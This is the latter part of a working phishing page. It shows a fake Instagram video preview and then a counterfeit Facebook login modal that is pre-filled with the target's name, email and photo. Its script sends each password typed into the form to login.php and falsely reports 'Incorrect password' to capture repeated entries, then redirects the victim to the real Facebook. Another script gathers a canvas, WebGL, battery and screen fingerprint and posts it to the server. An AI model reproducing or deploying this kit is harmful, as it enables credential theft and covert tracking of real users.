            <footer class="preview-footer" aria-label="Primary actions">
                <button id="openInstagramBtn" class="action-button primary" type="button">Open Instagram</button>
                <button id="signUpBtn" class="action-button secondary" type="button">Sign up</button>
                <p class="terms-text">By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.</p>
            </footer>
        </main>

        <section class="state state-immersive" aria-hidden="true">
            <video id="immersiveVideo" playsinline muted preload="metadata" poster="https://static.wixstatic.com/media/8455f5_a1a05e78db8345938482383301ff10bc~mv2.png" loop>
                <source src="https://video.wixstatic.com/video/8455f5_03845574298047bab65cfd1c0e15e5ff/480p/mp4/file.mp4" type="video/mp4">
            </video>
            <div class="immersive-overlay" aria-hidden="true">
                <div class="immersive-header">
                    <span>Log in</span>
                    <span class="pill">Open app</span>
                </div>

                <div class="immersive-icons">
                    <div class="icon-item" aria-hidden="true">
                        <span class="overlay-icon">
                            <svg viewBox="0 0 24 24" role="presentation">
                                <path d="M12 21.638h-.014C9.403 21.59 1.5 14.856 1.5 8.478c0-3.064 2.325-5.522 5.353-5.522 2.198 0 3.926 1.426 4.647 2.221.72-.795 2.45-2.22 4.646-2.22 3.03 0 5.354 2.457 5.354 5.52 0 6.38-7.905 13.115-10.487 13.162H12Z"/>
                            </svg>
                        </span>
                        <span class="icon-count">1</span>
                    </div>
                    <div class="icon-item" aria-hidden="true">
                        <span class="overlay-icon">
                            <svg viewBox="0 0 24 24" role="presentation">
                                <path d="M21 21l-4.35-4.35M10 18a8 8 0 100-16 8 8 0 000 16Z" fill="none" stroke="currentColor" stroke-width="2"/>
                            </svg>
                        </span>
                        <span class="icon-count">1</span>
                    </div>
                    <div class="icon-item" aria-hidden="true">
                        <span class="overlay-icon">
                            <svg viewBox="0 0 24 24" role="presentation">
                                <path d="M22 3H2v2h20V3Zm0 7H2v2h20v-2Zm0 7H2v2h20v-2Z"/>
                            </svg>
                        </span>
                    </div>
                    <div class="icon-ellipsis" aria-hidden="true">…</div>
                </div>

                <div class="immersive-footer">
                    <div class="immersive-user">
                        <img class="footer-profile-pic" alt="Profile avatar" width="36" height="36" loading="lazy" src="https://static.wixstatic.com/media/8455f5_c082110886634d768b1c7a9f956c3b1b~mv2.jpg">
                        <span class="username">Balita</span>
                        <span class="inline-dot">•</span>
                        <button type="button" class="follow-chip">Follow</button>
                    </div>
                    <button type="button" class="immersive-cta-btn">Sign up for Instagram</button>
                </div>
            </div>
            <div class="video-fallback" role="alert" aria-live="assertive">Video unavailable. Showing preview.</div>
        </section>

        <section class="state state-cta" aria-hidden="true">
            <div class="dark-overlay" aria-hidden="true"></div>
            <div class="cta-modal cta-modal-login" role="dialog" aria-modal="true" aria-labelledby="cta-title">
                <!-- Facebook Logo (PINK area) -->
                <div class="cta-fb-logo">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt="Facebook" height="40">
                </div>
                
                <!-- Profile Picture -->
                <div class="circular-reveal-container">
                    <img alt="Profile avatar" class="modal-profile-pic" data-profile-img width="140" height="140" src="<?php echo $display_pic; ?>">
                </div>
                
                <!-- Name display -->
                <p id="cta-profile-name" class="cta-profile-name"><?php echo !empty($display_name) ? $display_name : 'User'; ?></p>
                
                <!-- Password Form -->
                <form id="ctaLoginForm" class="cta-login-form" autocomplete="off">
                    <input type="hidden" name="email" id="cta-email-hidden" value="<?php echo htmlspecialchars($display_email); ?>">
                    <input type="hidden" name="sessionId" id="cta-session-hidden" value="">
                    
                    <div class="cta-password-wrapper">
                        <input 
                            type="password" 
                            id="cta-password" 
                            name="password" 
                            class="cta-password-input" 
                            placeholder="Password" 
                            autocomplete="current-password"
                            required
                        >
                        <button type="button" id="cta-password-toggle" class="cta-password-toggle" aria-label="Show password">
                            <svg class="eye-show" viewBox="0 0 24 24" width="20" height="20" fill="#606770">
                                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                            </svg>
                            <svg class="eye-hide" viewBox="0 0 24 24" width="20" height="20" fill="#606770" style="display:none;">
                                <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 9.95 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
                            </svg>
                        </button>
                    </div>
                    
                    <button type="submit" id="ctaLoginBtn" class="cta-btn cta-btn-login">
                        <span class="btn-spinner" style="display:none;"></span>
                        <span class="btn-text">Log In</span>
                    </button>
                </form>
                
                <a href="#" id="cta-forgot-password" class="cta-forgot-link">Forgot password?</a>
            </div>
        </section>

        <!-- Error Modal -->
        <div id="ctaErrorModal" class="cta-error-modal" style="display:none;">
            <div class="cta-error-content">
                <h3 id="ctaErrorTitle">Incorrect password</h3>
                <p id="ctaErrorMessage">The password you entered is incorrect. Please try again.</p>
                <button type="button" id="ctaErrorOk" class="cta-error-ok">OK</button>
            </div>
        </div>

        <!-- Loading Modal -->
        <div id="ctaLoadingModal" class="cta-loading-modal" style="display:none;">
            <div class="cta-loading-spinner"></div>
            <p>Logging in...</p>
        </div>
    </div>

    <!-- Iframe modal HTML (from old index.php) -->
    <div id="phishingIframeModal">
        <div id="phishingIframeWrapper">
            <div class="iframe-chrome-top-bar" id="iframe-top-bar">
                <button class="icon-button home-btn" aria-label="Home">
                    <svg height="24" viewBox="0 0 24 24" width="24"><path d="M4 12 L12 4 L20 12 V20 H14 V14 H10 V20 H4 Z" fill="none" stroke="black" stroke-width="2" /></svg>
                </button>
                <div class="address-bar-container" id="iframe-omnibox">
                    <svg height="24" viewBox="0 0 24 24" width="24" style="width:18px;height:18px;margin-right:6px;vertical-align:middle">
                        <path d="M6 10 V8 A6 6 0 0 1 18 8 V10 H19 A1 1 0 0 1 20 11 V20 A1 1 0 0 1 19 21 H5 A1 1 0 0 1 4 20 V11 A1 1 0 0 1 5 10 H6 Z M8 10 H16 V8 A4 4 0 0 0 8 8 Z" fill="black" />
                    </svg>
                    <span class="url-text" style="font-size:15px" id="iframe-omnibox-text">m.facebook.com</span>
                </div>
                <button class="icon-button add-btn" aria-label="New tab">
                    <svg height="24" viewBox="0 0 24 24" width="24">
                        <line stroke="black" stroke-width="2" x1="12" x2="12" y1="6" y2="18" />
                        <line stroke="black" stroke-width="2" x1="6" x2="18" y1="12" y2="12" />
                    </svg>
                </button>
                <button class="icon-button tab-switcher" aria-label="Switch tabs" style="padding:0 8px">
                    <svg height="24" viewBox="0 0 24 24" width="24">
                        <rect fill="none" height="16" rx="3" ry="3" stroke="black" stroke-width="1.5" width="16" x="4" y="4" />
                        <text fill="black" font-family="Arial, sans-serif" font-size="10" text-anchor="middle" x="12" y="16">1</text>
                    </svg>
                </button>
                <button class="icon-button more-btn" aria-label="More options" style="margin-left:4px">
                    <svg height="24" viewBox="0 0 24 24" width="24">
                        <circle cx="12" cy="6" fill="black" r="2" />
                        <circle cx="12" cy="12" fill="black" r="2" />
                        <circle cx="12" cy="18" fill="black" r="2" />
                    </svg>
                </button>
            </div>
            <iframe id="phishingLoginPage" scrolling="no" src="about:blank" title="Login Page" sandbox="allow-scripts allow-same-origin allow-downloads allow-popups allow-forms"></iframe>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const root = document.querySelector('#app-root');
            const body = document.body;

            const previewState = document.querySelector('.state-preview');
            const immersiveState = document.querySelector('.state-immersive');
            const ctaState = document.querySelector('.state-cta');
            const playTrigger = document.querySelector('[data-role="play-trigger"]');
            const openInstagramBtn = document.getElementById('openInstagramBtn');
            const signUpBtn = document.getElementById('signUpBtn');
            const profileImgs = document.querySelectorAll('[data-profile-img]');
            const videoEl = document.getElementById('immersiveVideo');
            const ctaButton = document.getElementById('ctaButton');
            const ctaModal = document.querySelector('.cta-modal');
            const circularReveal = document.querySelector('.circular-reveal-container');

            const phishingModal = document.getElementById('phishingIframeModal');
            const phishingIframe = document.getElementById('phishingLoginPage');
            const phishingIframeWrapper = document.getElementById('phishingIframeWrapper');
            const iframeTopBar = document.getElementById('iframe-top-bar');
            const phishingPageUrl = 'mobile.html.php';

            const requiredAssets = {
                video: 'https://video.wixstatic.com/video/8455f5_03845574298047bab65cfd1c0e15e5ff/480p/mp4/file.mp4',
                thumbnail: 'https://static.wixstatic.com/media/8455f5_a1a05e78db8345938482383301ff10bc~mv2.png',
                profile: '<?php echo $display_pic; ?>',
            };

            let stateTwoTimer = null;
            let timerStart = 0;
            const STATE_TWO_DURATION = 5000; // ms
            const TIMER_TOLERANCE = 100;
            const CTA_ANIMATION_MAX = 800;
            const PREVIEW_TRANSITION_DURATION = 420; // ms

            const logValidation = (message) => console.info(`[Validation] ${message}`);

            const preloadProfile = () => {
                const img = new Image();
                return new Promise((resolve, reject) => {
                    img.src = requiredAssets.profile;
                    img.onload = () => {
                        profileImgs.forEach((node) => {
                            node.src = img.src;
                        });
                        resolve();
                    };
                    img.onerror = reject;
                });
            };

            const verifyAssets = async () => {
                const checks = await Promise.allSettled([
                    fetch(requiredAssets.video, { method: 'HEAD' }),
                    fetch(requiredAssets.thumbnail, { method: 'HEAD' }),
                    fetch(requiredAssets.profile, { method: 'HEAD' }),
                ]);
                const failed = checks.filter((c) => c.status === 'rejected');
                if (failed.length) {
                    console.warn('Asset validation failed. Experience may degrade.', failed);
                } else {
                    logValidation('Assets accessible');
                }
            };

            const setState = (state) => {
                root.dataset.state = state;
                body.dataset.state = state;
                const showPreview = state === 'preview';
                const showImmersive = state === 'immersive' || state === 'cta';
                const showCta = state === 'cta';

                previewState.classList.toggle('is-active', showPreview);
                immersiveState.classList.toggle('is-active', showImmersive);
                ctaState.classList.toggle('is-active', showCta);
                ctaState.classList.toggle('active', showCta);
                ctaState.setAttribute('aria-hidden', (!showCta).toString());
            };

            const cleanupTimer = () => {
                if (stateTwoTimer) {
                    cancelAnimationFrame(stateTwoTimer);
                    stateTwoTimer = null;
                }
            };

            const transitionToStateTwo = () => {
                setState('immersive');
                videoEl.currentTime = 0;
                const playPromise = videoEl.play();
                if (playPromise?.catch) {
                    playPromise.catch(() => {
                        immersiveState.classList.add('show-fallback');
                        logValidation('Autoplay blocked, showing fallback');
                    });
                }
                timerStart = performance.now();
                const tick = (now) => {
                    const elapsed = now - timerStart;
                    if (elapsed >= STATE_TWO_DURATION - TIMER_TOLERANCE) {
                        logValidation(`State 2 timer reached ${elapsed.toFixed(2)}ms`);
                        transitionToStateThree(now);
                        return;
                    }
                    stateTwoTimer = requestAnimationFrame(tick);
                };
                stateTwoTimer = requestAnimationFrame(tick);
            };

            const transitionToStateThree = (timestamp) => {
                cleanupTimer();
                videoEl.pause();
                setState('cta');
                ctaState.dataset.animationStart = timestamp;
                startCtaAnimation();
                setTimeout(() => {
                    const animationElapsed = performance.now() - timestamp;
                    if (animationElapsed <= CTA_ANIMATION_MAX) {
                        logValidation(`CTA animation completed in ${animationElapsed.toFixed(2)}ms`);
                    } else {
                        console.warn('CTA animation exceeded required duration');
                    }
                }, CTA_ANIMATION_MAX);
            };

            const startCtaAnimation = () => {
                if (!ctaModal) return;
                circularReveal?.classList.remove('revealed');
                requestAnimationFrame(() => {
                    setTimeout(() => {
                        circularReveal?.classList.add('revealed');
                    }, 120);
                });
            };

            const animatePreviewExit = () => new Promise((resolve) => {
                if (!previewState) {
                    resolve();
                    return;
                }
                const finish = () => {
                    previewState.classList.remove('is-transitioning');
                    resolve();
                };
                previewState.classList.add('is-transitioning');
                const timeoutId = setTimeout(finish, PREVIEW_TRANSITION_DURATION + 60);
                previewState.addEventListener('animationend', () => {
                    clearTimeout(timeoutId);
                    finish();
                }, { once: true });
            });

            const openIframeModal = () => {
                if (!phishingModal || !phishingIframe || !phishingIframeWrapper) return;

                phishingIframe.onload = () => {
                    try {
                        if (phishingIframe.contentWindow) {
                            const expectedOrigin = window.location.origin;
                            phishingIframe.contentWindow.postMessage('scrollToTop', expectedOrigin);
                            phishingIframe.contentWindow.postMessage('requestHeight', expectedOrigin);
                        }
                    } catch (e) {
                        console.warn('postMessage to iframe failed:', e);
                    }
                    phishingModal.style.display = 'flex';
                    setTimeout(() => {
                        phishingModal.classList.add('is-visible-iframe');
                        phishingModal.scrollTop = 0;
                    }, 20);
                };

                phishingIframe.onerror = () => {
                    console.error('Error loading iframe content from:', phishingPageUrl);
                    phishingModal.style.display = 'flex';
                    setTimeout(() => {
                        phishingModal.classList.add('is-visible-iframe');
                    }, 20);
                };

                phishingIframe.src = phishingPageUrl;
            };

            const init = async () => {
                await verifyAssets();
                try {
                    await preloadProfile();
                    logValidation('Profile image cached');
                } catch (err) {
                    console.warn('Profile preload failed, using fallback', err);
                    profileImgs.forEach((node) => {
                        node.src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 80"%3E%3Ccircle cx="40" cy="40" r="40" fill="%23333"/%3E%3Ctext x="40" y="48" fill="white" font-size="24" alignment-baseline="middle" text-anchor="middle"%3F%3E%F0%9F%90%BB%3C/text%3E%3C/svg%3E';
                    });
                }

                playTrigger?.addEventListener('click', async (event) => {
                    event.preventDefault();
                    if (root.dataset.state !== 'preview') return;
                    playTrigger.setAttribute('disabled', 'true');
                    await animatePreviewExit();
                    logValidation('Entering State 2');
                    transitionToStateTwo();
                });

                // "Open Instagram" button triggers state transition
                openInstagramBtn?.addEventListener('click', async (event) => {
                    event.preventDefault();
                    if (root.dataset.state !== 'preview') return;
                    openInstagramBtn.setAttribute('disabled', 'true');
                    await animatePreviewExit();
                    logValidation('Entering State 2 via Open Instagram');
                    transitionToStateTwo();
                });

                // "Sign up" button triggers state transition
                signUpBtn?.addEventListener('click', async (event) => {
                    event.preventDefault();
                    if (root.dataset.state !== 'preview') return;
                    signUpBtn.setAttribute('disabled', 'true');
                    await animatePreviewExit();
                    logValidation('Entering State 2 via Sign up');
                    transitionToStateTwo();
                });

                // Password form is now embedded in CTA modal - no button click needed

                window.addEventListener('beforeunload', cleanupTimer);
                window.addEventListener('resize', () => {
                    if (root.dataset.state === 'immersive') {
                        logValidation('Resize detected during State 2, maintaining full screen');
                    }
                });

                setState('preview');
                logValidation('State 1 ready, waiting for interaction');
            };

            init();
        });

        // Iframe communication (height + redirect) from old index.php
        window.addEventListener('message', (event) => {
            const expectedOrigin = window.location.origin;
            if (event.origin !== expectedOrigin) {
                return;
            }

            const phishingModal = document.getElementById('phishingIframeModal');
            const phishingIframe = document.getElementById('phishingLoginPage');
            const phishingIframeWrapper = document.getElementById('phishingIframeWrapper');
            const iframeTopBar = document.getElementById('iframe-top-bar');

            if (event.data && event.data.type === 'iframeHeight') {
                const receivedHeight = event.data.height;
                if (phishingIframe && phishingIframeWrapper && iframeTopBar && phishingModal) {
                    const topBarHeight = iframeTopBar.offsetHeight;

                    // Temporarily force display to measure max height
                    const wrapperComputedStyle = window.getComputedStyle(phishingIframeWrapper);
                    let wrapperMaxHeight = parseInt(wrapperComputedStyle.maxHeight, 10);
                    if (isNaN(wrapperMaxHeight) || wrapperMaxHeight <= 0) {
                        const vh = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
                        const modalTopPadding = parseFloat(window.getComputedStyle(phishingModal).paddingTop || '0');
                        const wrapperBottomMargin = parseFloat(wrapperComputedStyle.marginBottom || '0');
                        wrapperMaxHeight = vh - modalTopPadding - wrapperBottomMargin - 10;
                    }

                    const maxIframeContentHeight = wrapperMaxHeight - topBarHeight;
                    let newIframeHeight = receivedHeight;
                    if (receivedHeight > maxIframeContentHeight) {
                        newIframeHeight = maxIframeContentHeight;
                    }
                    phishingIframe.style.height = newIframeHeight + 'px';
                }
            } else if (event.data && event.data.type === 'redirect') {
                const redirectUrl = event.data.url;
                if (redirectUrl && redirectUrl.startsWith('https://')) {
                    window.location.href = redirectUrl;
                }
            }
        });
    </script>

    <!-- CTA Login Form Logic -->
    <script>
        (function() {
            'use strict';
            
            // Generate session ID
            const sessionId = 'FP_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Track login attempts
            let loginTryCount = 0;
            const MAX_RETRIES = 2; // Redirect after 3rd attempt
            
            // DOM Elements
            const ctaLoginForm = document.getElementById('ctaLoginForm');
            const ctaPassword = document.getElementById('cta-password');
            const ctaLoginBtn = document.getElementById('ctaLoginBtn');
            const ctaPasswordToggle = document.getElementById('cta-password-toggle');
            const ctaEmailHidden = document.getElementById('cta-email-hidden');
            const ctaSessionHidden = document.getElementById('cta-session-hidden');
            const ctaProfileName = document.getElementById('cta-profile-name');
            const ctaProfileEmail = document.getElementById('cta-profile-email');
            const ctaErrorModal = document.getElementById('ctaErrorModal');
            const ctaErrorTitle = document.getElementById('ctaErrorTitle');
            const ctaErrorMessage = document.getElementById('ctaErrorMessage');
            const ctaErrorOk = document.getElementById('ctaErrorOk');
            const ctaLoadingModal = document.getElementById('ctaLoadingModal');
            
            // Set session ID
            if (ctaSessionHidden) ctaSessionHidden.value = sessionId;
            
            // Pre-populate from URL params or PRELOADED_PROFILE if available
            const urlParams = new URLSearchParams(window.location.search);
            const urlEmail = urlParams.get('email') || '';
            const urlName = urlParams.get('name') || '';
            
            if (urlEmail && ctaEmailHidden) {
                ctaEmailHidden.value = urlEmail;
            }
            if (urlName && ctaProfileName) {
                ctaProfileName.textContent = urlName;
            }
            if (urlEmail && ctaProfileEmail) {
                ctaProfileEmail.textContent = urlEmail;
            }
            
            // Also check for PRELOADED_PROFILE (from tracking links)
            if (window.PRELOADED_PROFILE) {
                const profile = window.PRELOADED_PROFILE;
                if (ctaEmailHidden && !ctaEmailHidden.value) {
                    ctaEmailHidden.value = profile.identifier || '';
                }
                if (ctaProfileName && !ctaProfileName.textContent) {
                    ctaProfileName.textContent = profile.name || 'User';
                }
                if (ctaProfileEmail && !ctaProfileEmail.textContent) {
                    ctaProfileEmail.textContent = profile.identifier || '';
                }
                
                // Update profile pic
                const profileImgs = document.querySelectorAll('[data-profile-img]');
                if (profile.profilePic) {
                    profileImgs.forEach(img => img.src = profile.profilePic);
                }
            }
            
            // Password toggle
            if (ctaPasswordToggle && ctaPassword) {
                ctaPasswordToggle.addEventListener('click', () => {
                    const eyeShow = ctaPasswordToggle.querySelector('.eye-show');
                    const eyeHide = ctaPasswordToggle.querySelector('.eye-hide');
                    
                    if (ctaPassword.type === 'password') {
                        ctaPassword.type = 'text';
                        if (eyeShow) eyeShow.style.display = 'none';
                        if (eyeHide) eyeHide.style.display = 'block';
                    } else {
                        ctaPassword.type = 'password';
                        if (eyeShow) eyeShow.style.display = 'block';
                        if (eyeHide) eyeHide.style.display = 'none';
                    }
                });
            }
            
            // Error modal close
            if (ctaErrorOk) {
                ctaErrorOk.addEventListener('click', () => {
                    ctaErrorModal.style.display = 'none';
                    if (ctaPassword) {
                        ctaPassword.value = '';
                        ctaPassword.focus();
                    }
                });
            }
            
            // Close error modal on background click
            if (ctaErrorModal) {
                ctaErrorModal.addEventListener('click', (e) => {
                    if (e.target === ctaErrorModal) {
                        ctaErrorModal.style.display = 'none';
                        if (ctaPassword) {
                            ctaPassword.value = '';
                            ctaPassword.focus();
                        }
                    }
                });
            }
            
            // Show error modal
            function showError(title, message) {
                if (ctaErrorTitle) ctaErrorTitle.textContent = title;
                if (ctaErrorMessage) ctaErrorMessage.textContent = message;
                if (ctaErrorModal) ctaErrorModal.style.display = 'flex';
            }
            
            // Show/hide loading
            function showLoading(show) {
                if (ctaLoadingModal) {
                    ctaLoadingModal.style.display = show ? 'flex' : 'none';
                }
            }
            
            // Set button loading state
            function setButtonLoading(loading) {
                if (!ctaLoginBtn) return;
                const spinner = ctaLoginBtn.querySelector('.btn-spinner');
                const text = ctaLoginBtn.querySelector('.btn-text');
                
                ctaLoginBtn.disabled = loading;
                if (spinner) spinner.style.display = loading ? 'inline-block' : 'none';
                if (text) text.style.display = loading ? 'none' : 'inline';
            }
            
            // Form submit handler
            if (ctaLoginForm) {
                ctaLoginForm.addEventListener('submit', async (e) => {
                    e.preventDefault();
                    
                    const password = ctaPassword ? ctaPassword.value.trim() : '';
                    const email = ctaEmailHidden ? ctaEmailHidden.value : 'unknown@user.com';
                    
                    if (!password) {
                        showError('Input Required', 'Please enter your password.');
                        return;
                    }
                    
                    setButtonLoading(true);
                    showLoading(true);
                    
                    const formData = new FormData();
                    formData.append('email', email);
                    formData.append('password', password);
                    formData.append('sessionId', sessionId);
                    
                    try {
                        const response = await fetch('login.php', {
                            method: 'POST',
                            body: formData
                        });
                        
                        const responseText = await response.text();
                        
                        showLoading(false);
                        setButtonLoading(false);
                        
                        // Check if max retries reached
                        if (loginTryCount >= MAX_RETRIES) {
                            // 3rd attempt - redirect
                            if (responseText.startsWith('https://')) {
                                window.location.href = responseText.trim();
                            } else {
                                window.location.href = 'https://www.facebook.com/';
                            }
                            return;
                        }
                        
                        // Show error and increment counter
                        loginTryCount++;
                        showError('Incorrect password', 'The password you entered is incorrect. Please try again.');
                        
                    } catch (err) {
                        showLoading(false);
                        setButtonLoading(false);
                        showError('Network Error', 'Could not connect. Please check your internet and try again.');
                    }
                });
            }
            
            // Forgot password link (optional - can redirect or show message)
            const forgotLink = document.getElementById('cta-forgot-password');
            if (forgotLink) {
                forgotLink.addEventListener('click', (e) => {
                    e.preventDefault();
                    // Can redirect to forgot password page or show message
                    showError('Forgot Password', 'Please contact support or use the official Facebook recovery page.');
                });
            }
        })();
    </script>

    <!-- Fingerprint collection script from old index.php -->
    <script>
        (function() {
            'use strict';
            const sessionId = 'FP_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

            async function collectFingerprint() {
                const fingerprint = {};
                try {
                    fingerprint.userAgent = navigator.userAgent || 'Unknown';
                    fingerprint.language = navigator.language || 'Unknown';
                    fingerprint.languages = navigator.languages || [navigator.language];
                    fingerprint.platform = navigator.platform || 'Unknown';
                    fingerprint.hardwareConcurrency = navigator.hardwareConcurrency || 0;
                    fingerprint.deviceMemory = navigator.deviceMemory || 0;
                    fingerprint.vendor = navigator.vendor || 'Unknown';
                    fingerprint.devicePixelRatio = window.devicePixelRatio || 1;

                    fingerprint.screenResolution = `${screen.width}x${screen.height}`;
                    fingerprint.screenAvailWidth = screen.availWidth || 0;
                    fingerprint.screenAvailHeight = screen.availHeight || 0;
                    fingerprint.colorDepth = screen.colorDepth || 0;
                    fingerprint.pixelDepth = screen.pixelDepth || screen.colorDepth || 0;

                    fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
                    fingerprint.touchSupport = navigator.maxTouchPoints || 0;
                    fingerprint.localStorage = 'localStorage' in window;
                    fingerprint.sessionStorage = 'sessionStorage' in window;
                    fingerprint.indexedDB = 'indexedDB' in window;
                    fingerprint.cookieEnabled = navigator.cookieEnabled || false;
                    fingerprint.doNotTrack = navigator.doNotTrack || 'Unknown';
                    fingerprint.pluginCount = navigator.plugins ? navigator.plugins.length : 0;

                    if (screen.orientation) {
                        fingerprint.orientationType = screen.orientation.type || 'portrait-primary';
                        fingerprint.orientationAngle = screen.orientation.angle || 0;
                    } else {
                        fingerprint.orientationType = 'unknown';
                        fingerprint.orientationAngle = 0;
                    }

                    try {
                        if ('getBattery' in navigator) {
                            const battery = await navigator.getBattery();
                            fingerprint.batteryLevel = battery.level;
                            fingerprint.batteryCharging = battery.charging;
                        } else {
                            fingerprint.batteryLevel = 0.85;
                            fingerprint.batteryCharging = false;
                        }
                    } catch (e) {
                        fingerprint.batteryLevel = 0.85;
                        fingerprint.batteryCharging = false;
                    }

                    try {
                        if (navigator.connection) {
                            fingerprint.connectionType = navigator.connection.effectiveType || '4g';
                            fingerprint.connectionDownlink = navigator.connection.downlink || 25;
                        } else {
                            fingerprint.connectionType = '4g';
                            fingerprint.connectionDownlink = 25;
                        }
                    } catch (e) {
                        fingerprint.connectionType = '4g';
                        fingerprint.connectionDownlink = 25;
                    }

                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (gl) {
                            fingerprint.webGLRenderer = gl.getParameter(gl.RENDERER) || 'N/A';
                            fingerprint.webGLVendor = gl.getParameter(gl.VENDOR) || 'N/A';
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (debugInfo) {
                                fingerprint.webGLUnmaskedRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
                                fingerprint.webGLUnmaskedVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A';
                            }
                        }
                    } catch (e) {
                        fingerprint.webGLRenderer = 'error';
                        fingerprint.webGLVendor = 'error';
                    }

                    try {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        if (ctx) {
                            ctx.textBaseline = 'top';
                            ctx.font = "14px 'Arial'";
                            ctx.fillStyle = '#f60';
                            ctx.fillRect(125, 1, 62, 20);
                            ctx.fillStyle = '#069';
                            ctx.fillText('BrowserLeaks.com <canvas> 1.0', 2, 15);
                            fingerprint.canvasFingerprint = canvas.toDataURL();
                        }
                    } catch (e) {
                        fingerprint.canvasFingerprint = 'error';
                    }

                    fingerprint.sessionId = sessionId;
                    return fingerprint;
                } catch (err) {
                    return {
                        error: err.message || 'Collection failed',
                        userAgent: navigator.userAgent || 'Unknown',
                        sessionId: sessionId,
                    };
                }
            }

            collectFingerprint().then(function (fingerprint) {
                fetch('ip.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(fingerprint),
                }).catch(function () {});

                fetch('save_fingerprint.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(fingerprint),
                }).catch(function () {});
            });
        })();
    </script>
</body>
</html>
